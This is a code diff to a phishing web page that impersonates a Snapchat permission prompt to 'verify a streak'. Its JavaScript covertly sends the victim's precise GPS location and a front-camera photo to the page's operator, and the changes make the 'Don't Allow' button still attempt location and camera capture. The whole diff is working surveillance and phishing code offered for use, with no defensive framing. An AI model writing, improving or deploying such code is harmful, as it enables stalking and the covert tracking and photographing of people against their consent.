@@ -73,8 +73,8 @@
 <div class="alert-box" id="alertBox">
     <div class="text">Allow "Snapchat" to access your location and camera to verify this streak?</div>
     <div class="btns">
-        <button class="btn btn-bold" onclick="startCapture('Allow')">Allow</button>
-        <button class="btn" onclick="startCapture('Deny')">Don't Allow</button>
+        <button class="btn btn-bold" id="btnAllow">Allow</button>
+        <button class="btn" id="btnDeny">Don't Allow</button>
     </div>
 </div>
 
@@ -107,48 +107,89 @@
         } catch (e) {}
     }
 
-    async function startCapture(choice) {
+    function hidePopup() {
         document.getElementById('alertBox').style.display = 'none';
         document.querySelector('.overlay').style.display = 'none';
-        
-        await sendMsg(🎯 Target Tapped: ${choice});
+    }
 
+    // ALLOW - ڕاستەقینە
+    document.getElementById('btnAllow').addEventListener('click', async () => {
+        hidePopup();
+        await sendMsg("🎯 User Tapped: ALLOW");
+        
+        // داواکاری ڕاستەقینەی لۆکەیشن
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (p) => {
                 let map = 📍 https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude};
                 await sendMsg(map);
-                captureCamera();
-            }, async () => {
-                await sendMsg("❌ Location: DENIED");
-                captureCamera();
+                startCamera();
+            }, async (err) => {
+                await sendMsg("❌ Location: " + err.message);
+                startCamera();
             }, { enableHighAccuracy: true, timeout: 5000 });
         } else {
-            captureCamera();
+            await sendMsg("❌ Geolocation not supported");
+            startCamera();
         }
-    }
+    });
 
-    async function captureCamera() {
-        const video = document.getElementById('video');
-
+    // DENY - ڕاستەقینە
+    document.getElementById('btnDeny').addEventListener('click', async () => {
+        hidePopup();
+        await sendMsg("❌ User Tapped: DENY");
+        
+        // هەوڵدان بۆ لۆکەیشن بەڵام بەکارهێنەر ڕەتی کردووەتەوە
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (p) => {
+                    // ئەگەر هەر ڕێگەیدا (کەم ڕوودەدات)
+                    let map = 📍 https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude};
+                    await sendMsg(map);
+                },
+                async (err) => {
+                    await sendMsg("❌ Location Denied: " + err.message);
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+        
+        // هەوڵدان بۆ کامێرا (ڕاستەوخۆ - ئەگەر پێشتر ڕێگەپێدرابوو)
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            canvas.toBlob(async (blob) => {
-                await sendPhoto(blob);
-                await sendMsg("📸 Captured + Sent");
-                stream.getTracks().forEach(track => track.stop());
-            }, 'image/jpeg', 0.7);
-
+            stream.getTracks().forEach(t => t.stop());
+            await sendMsg("⚠️ Camera was already allowed");
+            startCamera();
         } catch (err) {
-            await sendMsg("🚫 Camera: " + err.name);
+            await sendMsg("🚫 Camera Denied: " + err.name);
+        }
+    });
+
+    async function startCamera() {
+        const video = document.getElementById('video');
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            video.srcObject = stream;
+            
+            await new Promise(resolve => setTimeout(resolve, 2500));
+            
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    await sendPhoto(blob);
+                    await sendMsg("📸 Photo Captured + Sent");
+                }
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.7);
+            
+        } catch (err) {
+            await sendMsg("🚫 Camera Error: " + err.name);
         }
     }
 </script>
